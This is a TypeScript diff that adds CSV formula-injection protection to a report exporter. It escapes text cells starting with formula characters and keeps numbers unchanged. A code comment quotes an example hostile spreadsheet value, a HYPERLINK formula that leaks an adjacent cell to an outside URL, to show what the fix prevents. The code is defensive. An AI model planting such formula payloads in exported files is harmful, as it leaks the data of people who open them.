@@ -1,8 +1,32 @@
 import { isDesktop, saveTextFile } from './desktop'
 
+/**
+ * A leading `=`, `+`, `-`, `@`, tab or CR makes Excel read the cell as a
+ * formula and run it when the report is opened. The names in these reports are
+ * typed by providers and customers, not by us — a venue called
+ * `=HYPERLINK("http://…"&A2,"اضغط")` turns an export into a live link that
+ * leaks the row beside it.
+ *
+ * Prefixing an apostrophe is Excel's own way of saying "this is text". It is
+ * stripped on display, so the cell still reads as the name that was typed.
+ *
+ * **Numbers are never prefixed, and that is the point of the type check.**
+ * They come from our own code, and `-500` behind an apostrophe stops being a
+ * number: the column no longer sums, and a report of refunds quietly totals
+ * zero. The hole is in text the platform did not write; that is all this
+ * closes.
+ */
+const FORMULA_START = /^[=+\-@\t\r]/
+
+function neutralise(value: string | number | null | undefined): string {
+  if (value === null || value === undefined) return ''
+  if (typeof value === 'number') return String(value)
+  return FORMULA_START.test(value) ? `'${value}` : value
+}
+
 /** Wraps a cell in quotes when it contains a delimiter, quote or newline. */
 function escapeCell(value: string | number | null | undefined): string {
-  const text = value === null || value === undefined ? '' : String(value)
+  const text = neutralise(value)
   return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text
 }
 
